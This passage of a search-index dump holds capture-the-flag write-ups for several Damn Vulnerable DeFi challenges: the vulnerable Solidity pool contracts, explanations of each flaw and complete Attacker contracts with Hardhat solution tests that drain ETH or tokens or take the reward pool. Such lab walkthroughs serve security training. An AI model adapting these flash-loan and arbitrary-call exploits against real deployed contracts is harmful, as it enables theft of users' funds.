{}\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/02.%20Naive%20receiver/#goal","title":"Goal","text":"<p>Take all ETH out of the user\u2019s (FlashLoanReceiver) contract in a single transaction.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/02.%20Naive%20receiver/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The vulnerable part of the code is located in the NaiveReceiverLenderPool contract, inside the flashLoan() function.</p> <p>Instead of relying on the balance of ether (address(this).balance) inside the NaiveReceiverLenderPool contract, we rely on an arbitrary amount of ETH, that can be set on function call, as a balance to be transferred to the borrower contract (FlashLoanReceiver).</p> <p>This way we can call the flashLoan() function with 0 as amount, and after calculating the fee and after the loan has been settled, this will leave the borrower with 1 eth less. Repeating this operation for 10 times will leave the borrower with 0 ether.</p> <p>In order to do this in one transaction we can create Attacker contract, and call the flashLoan() function from NaiveReceiverLenderPool in a for loop 10 times.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instances from the NaiveReceiverLenderPool and FlashLoanReceiver contracts inside the Attacker contract</li> <li>in the constructor of the Attacker contract, in a for loop, call the flashLoan() function from NaiveReceiverLenderPool contract, set FlashLoanReceiver as borrower and set amount to be 0.</li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/02.%20Naive%20receiver/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"./NaiveReceiverLenderPool.sol\";\nimport \"./FlashLoanReceiver.sol\";\n\ncontract Attacker {\n\n    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n    NaiveReceiverLenderPool private immutable pool;\n    FlashLoanReceiver private immutable vulnerableReceiver;\n\n    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _vulnerableReceiver) {\n        pool = NaiveReceiverLenderPool(_pool);\n        vulnerableReceiver = FlashLoanReceiver(_vulnerableReceiver);\n\n        for(uint256 i = 0; i &lt; 10; i++) {\n            pool.flashLoan(\n                IERC3156FlashBorrower(vulnerableReceiver),\n                ETH,\n                0,\n                \"\"\n            );\n        }\n    }\n\n    receive() external payable {}\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/03.%20Truster/","title":"Truster","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"../DamnValuableToken.sol\";\n\n/**\n * @title TrusterLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TrusterLenderPool is ReentrancyGuard {\n    using Address for address;\n\n    DamnValuableToken public immutable token;\n\n    error RepayFailed();\n\n    constructor(DamnValuableToken _token) {\n        token = _token;\n    }\n\n    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)\n        external\n        nonReentrant\n        returns (bool)\n    {\n        uint256 balanceBefore = token.balanceOf(address(this));\n\n        token.transfer(borrower, amount);\n        target.functionCall(data);\n\n        if (token.balanceOf(address(this)) &lt; balanceBefore)\n            revert RepayFailed();\n\n        return true;\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/03.%20Truster/#goal","title":"Goal","text":"<p>Take all DVT tokens out of the pool (TrusterLenderPool) in a single transaction.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/03.%20Truster/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>In order to pass this challenge we need to call the flashLoan() function inside TrusterLenderPool from our Attacker contract.</p> <p>The exploitable part of flashLoan() function is in the following line of code:</p> <pre><code>target.functionCall(data);\n</code></pre> <p>To be able to finish this CTF we will need to use abi encodin.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the TrusterLenderPool contract inside the Attacker contract</li> <li>create executeFlashLoan(address player, address _token, uint245 amount) external function inside Attacker contract. This function will call flashLoan(uint256 amount, address borrower, address target, bytes calldata data) function from TrusterLenderPool with the following arguments:  <ul> <li>amount will be all the tokens in the pool, 1000000*10^18</li> <li>borrower will be the address of the TrusterLenderPool   contract itself (the pool will be transferring the funds to   iteslf)</li> <li>target will be the address of the token contract</li> <li>data will be abi.encodeWithSignature(\"approve(address,  uint256)\", address(this), amount), this will approve our   Attacker contract to spend the funds that belong to the pool on   their behalf</li> <li>create instance of the token</li> <li>call transferFrom() function from the token, we will be   transferring all of the tokens from the pool to our account   (player)</li> </ul> </li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/03.%20Truster/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../DamnValuableToken.sol\";\nimport { TrusterLenderPool } from \"./TrusterLenderPool.sol\";\n\ncontract Attacker {\n    TrusterLenderPool private immutable pool;\n\n    constructor(TrusterLenderPool _pool) {\n        pool = TrusterLenderPool(_pool);\n    }\n\n    function executeFlashLoan(address player, address _token, uint256 amount) external {\n        pool.flashLoan(\n            amount,\n            address(pool),\n            _token,\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(this), amount)\n        );\n\n        DamnValuableToken token = DamnValuableToken(_token);\n        token.transferFrom(address(pool), player, amount);\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/03.%20Truster/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\n\ndescribe('[Challenge] Truster', function () {\nlet deployer, player;\nlet token, pool;\n\nconst TOKENS_IN_POOL = 1000000n * 10n ** 18n;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n[deployer, player] = await ethers.getSigners();\n\ntoken = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();\npool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);\nexpect(await pool.token()).to.eq(token.address);\n\nawait token.transfer(pool.address, TOKENS_IN_POOL);\nexpect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);\n\nexpect(await token.balanceOf(player.address)).to.equal(0);\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nattacker = await (await ethers.getContractFactory('Attacker', player)).deploy(pool.address);\n\nawait attacker.executeFlashLoan(player.address, token.address, TOKENS_IN_POOL);\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n\n// Player has taken all tokens from the pool\nexpect(\nawait token.balanceOf(player.address)\n).to.equal(TOKENS_IN_POOL);\nexpect(\nawait token.balanceOf(pool.address)\n).to.equal(0);\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/04.%20Side%20Entrance/","title":"Side Entrance","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"solady/src/utils/SafeTransferLib.sol\";\n\ninterface IFlashLoanEtherReceiver {\n    function execute() external payable;\n}\n\n/**\n * @title SideEntranceLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SideEntranceLenderPool {\n    mapping(address =&gt; uint256) private balances;\n\n    error RepayFailed();\n\n    event Deposit(address indexed who, uint256 amount);\n    event Withdraw(address indexed who, uint256 amount);\n\n    function deposit() external payable {\n        unchecked {\n            balances[msg.sender] += msg.value;\n        }\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n\n        delete balances[msg.sender];\n        emit Withdraw(msg.sender, amount);\n\n        SafeTransferLib.safeTransferETH(msg.sender, amount);\n    }\n\n    function flashLoan(uint256 amount) external {\n        uint256 balanceBefore = address(this).balance;\n\n        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();\n\n        if (address(this).balance &lt; balanceBefore)\n            revert RepayFailed();\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/04.%20Side%20Entrance/#goal","title":"Goal","text":"<p>Take all ETH from the SideEntranceLenderPool contract</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/04.%20Side%20Entrance/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The vulnerable part of the contract is in the following check:</p> <pre><code>if (address(this).balance &lt; balanceBefore)\nrevert RepayFailed();\n</code></pre> <p>The code is checking if the balance in the lending pool is the same as before taking the flash loan, but does not check who this balance belongs to.</p> <p>In our Attacker contract we can call the flashLoan() function, and on the execute() callback function we can deposit the funds back to the SideEntranceLenderPool, only this time the funds will belong to the Attacker contract.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, this contract will be inheriting IFlashLoanEtherReceiver interface and must have execute() function implemented, we need to create instance from the SideEntranceLenderPool contract inside Attacker</li> <li>create makeFlashLoan() external function, inside this funciton we will call flashLoan() from the pool contract</li> <li> <p>create execute() function, this will be callback function that must be implemented, since the Attacker contract is inheriting the IFlashLoanEtherReceiver interface  <ul> <li>inside this function we will call the deposit() function from the pool contract</li> </ul></p> </li> <li> <p>create withdraw() external function, inside it we will:  <ul> <li>call the withdraw() function from the pool contract</li> <li>transfer the funds to our account</li> </ul> </p> </li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/04.%20Side%20Entrance/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport { SideEntranceLenderPool } from \"./SideEntranceLenderPool.sol\";\nimport { IFlashLoanEtherReceiver } from \"./SideEntranceLenderPool.sol\";\n\ncontract Attacker is IFlashLoanEtherReceiver {\n    event Log(string func, uint gas);\n\n    SideEntranceLenderPool private immutable pool;\n\n    constructor(SideEntranceLenderPool _pool) {\n        pool = SideEntranceLenderPool(_pool);\n    }\n\n    function execute() external payable override {\n        pool.deposit{value: msg.value}();\n    }\n\n    function withdraw() external {\n        pool.withdraw();\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function makeFlashLoan() external {\n        pool.flashLoan(address(pool).balance);\n    }\n\n    fallback() external payable {\n        // send / transfer (forwards 2300 gas to this fallback function)\n        // call (forwards all of the gas)\n        emit Log(\"fallback\", gasleft());\n    }\n\n    receive() external payable {\n        emit Log(\"receive\", gasleft());\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/04.%20Side%20Entrance/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\nconst { setBalance } = require('@nomicfoundation/hardhat-network-helpers');\n\ndescribe('[Challenge] Side entrance', function () {\nlet deployer, player;\nlet pool;\n\nconst ETHER_IN_POOL = 1000n * 10n ** 18n;\nconst PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n[deployer, player] = await ethers.getSigners();\n\n// Deploy pool and fund it\npool = await (await ethers.getContractFactory('SideEntranceLenderPool', deployer)).deploy();\nawait pool.deposit({ value: ETHER_IN_POOL });\nexpect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL);\n\n// Player starts with limited ETH in balance\nawait setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);\nexpect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);\n\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nattacker = await (await ethers.getContractFactory('Attacker', player)).deploy(pool.address);\n\nawait attacker.connect(player).makeFlashLoan();\n\nawait attacker.connect(player).withdraw();\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n\n// Player took all ETH from the pool\nexpect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);\nexpect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL);\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/05.%20The%20Rewarder/","title":"The Rewarder","text":"<p>AccountingToken.sol</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"solady/src/auth/OwnableRoles.sol\";\n\n/**\n * @title AccountingToken\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals\n *         with snapshotting capabilities.\n */\ncontract AccountingToken is ERC20Snapshot, OwnableRoles {\n    uint256 public constant MINTER_ROLE = _ROLE_0;\n    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;\n    uint256 public constant BURNER_ROLE = _ROLE_2;\n\n    error NotImplemented();\n\n    constructor() ERC20(\"rToken\", \"rTKN\") {\n        _initializeOwner(msg.sender);\n        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);\n    }\n\n    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {\n        _mint(to, amount);\n    }\n\n    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) {\n        _burn(from, amount);\n    }\n\n    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) {\n        return _snapshot();\n    }\n\n    function _transfer(address, address, uint256) internal pure override {\n        revert NotImplemented();\n    }\n\n    function _approve(address, address, uint256) internal pure override {\n        revert NotImplemented();\n    }\n}\n</code></pre> <p>FlashLoanerPool.sol</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../DamnValuableToken.sol\";\n\n/**\n * @title FlashLoanerPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n * @dev A simple pool to get flashloans of DVT\n */\ncontract FlashLoanerPool is ReentrancyGuard {\n    using Address for address;\n\n    DamnValuableToken public immutable liquidityToken;\n\n    error NotEnoughTokenBalance();\n    error CallerIsNotContract();\n    error FlashLoanNotPaidBack();\n\n    constructor(address liquidityTokenAddress) {\n        liquidityToken = DamnValuableToken(liquidityTokenAddress);\n    }\n\n    function flashLoan(uint256 amount) external nonReentrant {\n        uint256 balanceBefore = liquidityToken.balanceOf(address(this));\n\n        if (amount &gt; balanceBefore) {\n            revert NotEnoughTokenBalance();\n        }\n\n        if (!msg.sender.isContract()) {\n            revert CallerIsNotContract();\n        }\n\n        liquidityToken.transfer(msg.sender, amount);\n\n        msg.sender.functionCall(abi.encodeWithSignature(\"receiveFlashLoan(uint256)\", amount));\n\n        if (liquidityToken.balanceOf(address(this)) &lt; balanceBefore) {\n            revert FlashLoanNotPaidBack();\n        }\n    }\n}\n</code></pre> <p>RewardToken.sol</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"solady/src/auth/OwnableRoles.sol\";\n\n/**\n * @title RewardToken\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract RewardToken is ERC20, OwnableRoles {\n    uint256 public constant MINTER_ROLE = _ROLE_0;\n\n    constructor() ERC20(\"Reward Token\", \"RWT\") {\n        _initializeOwner(msg.sender);\n        _grantRoles(msg.sender, MINTER_ROLE);\n    }\n\n    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {\n        _mint(to, amount);\n    }\n}\n</code></pre> <p>TheRewarderPool.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"solady/src/utils/FixedPointMathLib.sol\";\nimport \"solady/src/utils/SafeTransferLib.sol\";\nimport { RewardToken } from \"./RewardToken.sol\";\nimport { AccountingToken } from \"./AccountingToken.sol\";\n\n/**\n * @title TheRewarderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract TheRewarderPool {\n    using FixedPointMathLib for uint256;\n\n    // Minimum duration of each round of rewards in seconds\n    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;\n\n    uint256 public constant REWARDS = 100 ether;\n\n    // Token deposited into the pool by users\n    address public immutable liquidityToken;\n\n    // Token used for internal accounting and snapshots\n    // Pegged 1:1 with the liquidity token\n    AccountingToken public immutable accountingToken;\n\n    // Token in which rewards are issued\n    RewardToken public immutable rewardToken;\n\n    uint128 public lastSnapshotIdForRewards;\n    uint64 public lastRecordedSnapshotTimestamp;\n    uint64 public roundNumber; // Track number of rounds\n    mapping(address =&gt; uint64) public lastRewardTimestamps;\n\n    error InvalidDepositAmount();\n\n    constructor(address _token) {\n        // Assuming all tokens have 18 decimals\n        liquidityToken = _token;\n        accountingToken = new AccountingToken();\n        rewardToken = new RewardToken();\n\n        _recordSnapshot();\n    }\n\n    /**\n     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.\n     *         Also distributes rewards if available.\n     * @param amount amount of tokens to be deposited\n     */\n    function deposit(uint256 amount) external {\n        if (amount == 0) {\n            revert InvalidDepositAmount();\n        }\n\n        accountingToken.mint(msg.sender, amount);\n        distributeRewards();\n\n        SafeTransferLib.safeTransferFrom(\n            liquidityToken,\n            msg.sender,\n            address(this),\n            amount\n        );\n    }\n\n    function withdraw(uint256 amount) external {\n        accountingToken.burn(msg.sender, amount);\n        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);\n    }\n\n    function distributeRewards() public returns (uint256 rewards) {\n        if (isNewRewardsRound()) {\n            _recordSnapshot();\n        }\n\n        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);\n        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);\n\n        if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) {\n            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);\n            if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) {\n                rewardToken.mint(msg.sender, rewards);\n                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);\n            }\n        }\n    }\n\n    function _recordSnapshot() private {\n        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());\n        lastRecordedSnapshotTimestamp = uint64(block.timestamp);\n        unchecked {\n            ++roundNumber;\n        }\n    }\n\n    function _hasRetrievedReward(address account) private view returns (bool) {\n        return (\n            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp\n                &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION\n        );\n    }\n\n    function isNewRewardsRound() public view returns (bool) {\n        return block.timestamp &gt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/05.%20The%20Rewarder/#goal","title":"Goal","text":"<p>Claim most of the rewards (RWT token) for ourselves.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/05.%20The%20Rewarder/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The vulnerable part of the code is located in the TheRewarderPool contract</p> <pre><code>rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);\n</code></pre> <p>the part were the rewards are calculated. To be able to spread the rewards equally we need to store the number of accounts that should receive awards, but this is not taken into account.</p> <p>To exploit the reward pool we need to:</p> <ol> <li>create Attacker contract, this contract will be borrowing the flash loan from the FlashLoanerPool, and need to have instances of of the FlashLoanerPool, TheRewarderPool and the DamnValuableToken contracts</li> <li> <p>create receiveFlashLoan(uint amount) external function, this will be the callback function that will be called when receiving the flash loan from FlashLoanerPool, inside this function we will:  <ul> <li>approve the TheRewarderPool to use the flash loan</li> <li>deposit the borrowed DVT tokens to the TheRewarderPool in order to be able to receive rewards</li> <li>withdraw the deposited DVT tokens from the TheRewarderPool</li> <li>return the loan to the FlashLoanerPool, transfer the DVT tokens to the flash loaner pool contract</li> </ul></p> </li> <li> <p>create attack(uint amount, address rewardToken) external function, inside this function we will execute the flash loan (call flashLoan function from the FlashLoanerPool contract), and after that transfer the reward tokens (RWT) to our EOA</p> </li> <li>wait for a new round to come, await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // 5 days</li> <li>create instance of the Attacker contract</li> <li>call the attack function on the Attacker contract</li> </ol>"},{"location":"3.%20Damn%20Vulnerable%20Defi/05.%20The%20Rewarder/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./FlashLoanerPool.sol\";\nimport \"./TheRewarderPool.sol\";\nimport \"../DamnValuableToken.sol\";\n\ncontract Attacker {\n    FlashLoanerPool private immutable pool;\n    TheRewarderPool private immutable rewarder;\n    DamnValuableToken private immutable liquidityToken;\n\n    constructor(FlashLoanerPool _pool, TheRewarderPool _rewarder, DamnValuableToken _liquidityToken) {\n        pool = FlashLoanerPool(_pool);\n        rewarder = TheRewarderPool(_rewarder);\n        liquidityToken = DamnValuableToken(_liquidityToken);\n    }\n\n    function receiveFlashLoan(uint256 amount) external {\n        liquidityToken.approve(address(rewarder), amount);\n        rewarder.deposit(amount);\n        rewarder.withdraw(amount);\n        liquidityToken.transfer(address(pool), amount);\n    }\n\n    function attack(uint256 amount, address rewardToken) external {\n        pool.flashLoan(amount);\n        IERC20(rewardToken).transfer(msg.sender, IERC20(rewardToken).balanceOf(address(this)));\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/05.%20The%20Rewarder/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\n\ndescribe('[Challenge] The rewarder', function () {\nconst TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens\nlet users, deployer, alice, bob, charlie, david, player;\nlet liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n\n[deployer, alice, bob, charlie, david, player] = await ethers.getSigners();\nusers = [alice, bob, charlie, david];\n\nconst FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);\nconst TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);\nconst DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);\nconst RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);\nconst AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);\n\nliquidityToken = await DamnValuableTokenFactory.deploy();\nflashLoanPool = await FlashLoanerPoolFactory.deploy(liquidityToken.address);\n\n// Set initial token balance of the pool offering flash loans\nawait liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL);\n\nrewarderPool = await TheRewarderPoolFactory.deploy(liquidityToken.address);\nrewardToken = RewardTokenFactory.attach(await rewarderPool.rewardToken());\naccountingToken = AccountingTokenFactory.attach(await rewarderPool.accountingToken());\n\n// Check roles in accounting token\nexpect(await accountingToken.owner()).to.eq(rewarderPool.address);\nconst minterRole = await accountingToken.MINTER_ROLE();\nconst snapshotRole = await accountingToken.SNAPSHOT_ROLE();\nconst burnerRole = await accountingToken.BURNER_ROLE();\nexpect(await accountingToken.hasAllRoles(rewarderPool.address, minterRole | snapshotRole | burnerRole)).to.be.true;\n\n// Alice, Bob, Charlie and David deposit tokens\nlet depositAmount = 100n * 10n ** 18n; for (let i = 0; i &lt; users.length; i++) {\nawait liquidityToken.transfer(users[i].address, depositAmount);\nawait liquidityToken.connect(users[i]).approve(rewarderPool.address, depositAmount);\nawait rewarderPool.connect(users[i]).deposit(depositAmount);\nexpect(\nawait accountingToken.balanceOf(users[i].address)\n).to.be.eq(depositAmount);\n}\nexpect(await accountingToken.totalSupply()).to.be.eq(depositAmount * BigInt(users.length));\nexpect(await rewardToken.totalSupply()).to.be.eq(0);\n\n// Advance time 5 days so that depositors can get rewards\nawait ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // 5 days\n\n// Each depositor gets reward tokens\nlet rewardsInRound = await rewarderPool.REWARDS();\nfor (let i = 0; i &lt; users.length; i++) {\nawait rewarderPool.connect(users[i]).distributeRewards();\nexpect(\nawait rewardToken.balanceOf(users[i].address)\n).to.be.eq(rewardsInRound.div(users.length));\n}\nexpect(await rewardToken.totalSupply()).to.be.eq(rewardsInRound);\n\n// Player starts with zero DVT tokens in balance\nexpect(await liquidityToken.balanceOf(player.address)).to.eq(0);\n\n// Two rounds must have occurred so far\nexpect(await rewarderPool.roundNumber()).to.be.eq(2);\n});\n\nit('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nawait ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // 5 days\n\nconst RewarderAttackerFactory = await ethers.getContractFactory('Attacker', player);\nrewarderAttacker = await RewarderAttackerFactory.deploy(\nflashLoanPool.address,\nrewarderPool.address,\nliquidityToken.address\n);\n\nconst tx = await rewarderAttacker.connect(player).attack(\nTOKENS_IN_LENDER_POOL,\nrewardToken.address\n);\nawait tx.wait();\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n// Only one round must have taken place\nexpect(\nawait rewarderPool.roundNumber()\n).to.be.eq(3);\n\n// Users should get neglegible rewards this round\nfor (let i = 0; i &lt; users.length; i++) {\nawait rewarderPool.connect(users[i]).distributeRewards();\nconst userRewards = await rewardToken.balanceOf(users[i].address);\nconst delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));\nexpect(delta).to.be.lt(10n ** 16n)\n}\n\n// Rewards must have been issued to the player account\nexpect(await rewardToken.totalSupply()).to.be.gt(await rewarderPool.REWARDS());\nconst playerRewards = await rewardToken.balanceOf(player.address);\nexpect(playerRewards).to.be.gt(0);\n\n// The amount of rewards earned should be close to total available amount\nconst delta = (await rewarderPool.REWARDS()).sub(playerRewards);\nexpect(delta).to.be.lt(10n ** 17n);\n\n// Balance of DVT tokens in player and lending pool hasn't changed\nexpect(await liquidityToken.balanceOf(player.address)).to.eq(0);\nexpect(\nawait liquidityToken.balanceOf(flashLoanPool.address)\n).to.eq(TOKENS_IN_LENDER_POOL);\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/06.%20Selfie/","title":"Selfie","text":"<p>ISimpleGovernance.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface ISimpleGovernance {\nstruct GovernanceAction {\nuint128 value;\nuint64 proposedAt;\nuint64 executedAt;\naddress target;\nbytes data;\n}\n\nerror NotEnoughVotes(address who);\nerror CannotExecute(uint256 actionId);\nerror InvalidTarget();\nerror TargetMustHaveCode();\nerror ActionFailed(uint256 actionId);\n\nevent ActionQueued(uint256 actionId, address indexed caller);\nevent ActionExecuted(uint256 actionId, address indexed caller);\n\nfunction queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);\nfunction executeAction(uint256 actionId) external payable returns (bytes memory returndata);\nfunction getActionDelay() external view returns (uint256 delay);\nfunction getGovernanceToken() external view returns (address token);\nfunction getAction(uint256 actionId) external view returns (GovernanceAction memory action);\nfunction getActionCounter() external view returns (uint256);\n}\n</code></pre> <p>SelfiePool.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"./SimpleGovernance.sol\";\n\n/**\n * @title SelfiePool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SelfiePool is ReentrancyGuard, IERC3156FlashLender {\n\n    ERC20Snapshot public immutable token;\n    SimpleGovernance public immutable governance;\n    bytes32 private constant CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n    error RepayFailed();\n    error CallerNotGovernance();\n    error UnsupportedCurrency();\n    error CallbackFailed();\n\n    event FundsDrained(address indexed receiver, uint256 amount);\n\n    modifier onlyGovernance() {\n        if (msg.sender != address(governance))\n            revert CallerNotGovernance();\n        _;\n    }\n\n    constructor(address _token, address _governance) {\n        token = ERC20Snapshot(_token);\n        governance = SimpleGovernance(_governance);\n    }\n\n    function maxFlashLoan(address _token) external view returns (uint256) {\n        if (address(token) == _token)\n            return token.balanceOf(address(this));\n        return 0;\n    }\n\n    function flashFee(address _token, uint256) external view returns (uint256) {\n        if (address(token) != _token)\n            revert UnsupportedCurrency();\n        return 0;\n    }\n\n    function flashLoan(\n        IERC3156FlashBorrower _receiver,\n        address _token,\n        uint256 _amount,\n        bytes calldata _data\n    ) external nonReentrant returns (bool) {\n        if (_token != address(token))\n            revert UnsupportedCurrency();\n\n        token.transfer(address(_receiver), _amount);\n        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)\n            revert CallbackFailed();\n\n        if (!token.transferFrom(address(_receiver), address(this), _amount))\n            revert RepayFailed();\n\n        return true;\n    }\n\n    function emergencyExit(address receiver) external onlyGovernance {\n        